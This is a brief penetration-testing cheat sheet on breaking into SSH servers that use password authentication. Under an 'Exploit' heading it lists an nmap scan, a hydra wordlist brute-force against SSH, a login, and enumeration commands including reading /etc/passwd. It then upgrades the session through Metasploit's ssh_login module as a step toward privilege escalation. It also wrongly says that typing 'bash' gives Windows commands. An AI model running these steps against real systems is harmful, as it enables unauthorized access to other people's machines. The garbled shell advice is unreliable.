SSH Auth can be configured in two ways:
  User/Pass auth
  Key based auth
In the case of user/pass auth, we can perform a brute-force attack on the SSH server in order to identify legit creds and gain access to the target system

---------------------------------Exploit---------------------------------------

nmap -sV <ip>
hydra -U <user word list> -P <pass word list> <IP> -t 4 ssh
ssh sysadmin@<IP>
yes
enter password
whoami
groups sysadmin (or any username you logged into, looking to be part of sudo group)
cat /etc/*issue
uname -r
cat /etc/passwd
ls

*********To get a better shell or command line, you can ues the MSF module ssh_login and enter creds there and can even upgrade the session with**************
sessions -u 1 (1 is the session of your SSH log in, use whichever one is that)
once in the command line, type "bash" to use windows commands and from here you can work on priv escalation if necessary
